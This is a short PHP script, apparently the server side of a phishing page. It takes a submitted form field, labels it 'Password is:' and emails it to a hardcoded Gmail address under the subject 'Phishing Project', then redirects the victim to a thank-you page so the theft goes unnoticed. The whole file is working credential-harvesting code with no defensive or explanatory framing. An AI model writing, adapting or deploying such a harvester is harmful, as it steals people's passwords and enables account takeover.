<?php
// Get the email text from the form submission
$emailText = $_POST['obtain'];

// Set the email recipient and subject
$to = 'azizzmillz@gmail.com';
$subject = 'Phishing Project';

// Set the email message body
$message = 'Password is: ' . $emailText;

// Send the email
mail($to, $subject, $message);

// Redirect the user to a thank-you page
header('Location: thankyou.html');
